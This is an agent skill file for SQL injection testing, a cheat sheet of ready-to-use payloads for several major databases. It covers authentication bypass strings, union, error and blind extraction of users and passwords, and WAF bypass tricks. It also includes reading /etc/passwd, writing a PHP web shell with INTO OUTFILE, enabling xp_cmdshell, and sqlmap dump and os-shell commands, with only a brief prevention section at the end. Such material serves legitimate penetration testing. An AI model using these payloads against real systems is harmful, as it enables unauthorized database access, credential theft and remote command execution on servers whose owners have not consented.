---
name: sqli
description: SQL injection - Union, Error, Blind, Time-based for all major databases. Use for database security testing.
---

# SQL Injection

## Description
SQL Injection is a code injection technique that exploits vulnerabilities in applications that construct SQL queries using user input. It can lead to unauthorized data access, data modification, authentication bypass, and in severe cases, remote code execution.

## Injection Types

### 1. In-Band (Classic)
- **Union-Based**: Extract data using UNION SELECT
- **Error-Based**: Extract data from error messages

### 2. Blind
- **Boolean-Based**: Infer data from true/false responses
- **Time-Based**: Infer data from response delays

### 3. Out-of-Band
- Use alternative channels (DNS, HTTP) to exfiltrate data

## Detection

### Basic Tests
```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or '
-- or #
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
```

### Error Triggering
```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=1/0--
'||(SELECT 1 FROM dual)||'
```

## Authentication Bypass

```sql
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
admin'--
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
1' or 1=1#
1' or 1=1--
1' or 1=1/*
```

## Union-Based Injection

### Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Identify Vulnerable Columns
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Extract Data (MySQL)
```sql
' UNION SELECT 1,2,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--
```

### Extract Data (PostgreSQL)
```sql
' UNION SELECT 1,current_user,3--
' UNION SELECT 1,current_database(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns--
```

### Extract Data (MSSQL)
```sql
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM syscolumns--
```

### Extract Data (Oracle)
```sql
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT user,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns--
```

## Error-Based Injection

### MySQL
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
```

### MSSQL
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int)--
```

### PostgreSQL
```sql
' AND 1=CAST((SELECT version()) AS int)--
```

## Blind SQL Injection

### Boolean-Based (MySQL)
```sql
' AND 1=1--   (true)
' AND 1=2--   (false)
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--
```

### Time-Based (MySQL)
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
```

### Time-Based (MSSQL)
```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Time-Based (PostgreSQL)
```sql
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Bypass Techniques

### Whitespace Alternatives
```sql
/**/
+
%20
%09
%0a
%0b
%0c
%0d
%a0
```

### Comment Variations
```sql
--
#
/**/
/*!*/
--+-
;%00
```

### Case Manipulation
```sql
SeLeCt
sElEcT
SELECT
```

### Keyword Alternatives
```sql
OR -> ||
AND -> &&
= -> LIKE
UNION SELECT -> UNION ALL SELECT
```

### No Comma
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
LIMIT 0,1 -> LIMIT 1 OFFSET 0
```

### No Spaces
```sql
UNION/**/SELECT/**/1,2,3
UNION(SELECT(1),(2),(3))
```

### No Quotes
```sql
-- Using hex
SELECT * FROM users WHERE name=0x61646d696e
-- Using CHAR()
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)
```

## Second-Order SQL Injection

```sql
-- First request: Store malicious payload
INSERT INTO users(username) VALUES ('admin'--');

-- Second request: Payload executed when data is used
SELECT * FROM logs WHERE username='admin'--';
```

## File Operations

### MySQL Read File
```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

### MySQL Write File
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### MSSQL Command Execution
```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

## Tools

### SQLMap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Get databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page?id=1" -D database --tables

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
```

### Ghauri
```bash
# Advanced SQLi detection
ghauri -u "http://target.com/page?id=1"
```

## Prevention

```python
# Use parameterized queries
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Use ORM
User.objects.filter(id=user_id)

# Input validation
if not user_id.isdigit():
    raise ValueError("Invalid ID")

# Least privilege database accounts
# WAF rules
# Regular security testing
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection
- https://owasp.org/www-community/attacks/SQL_Injection
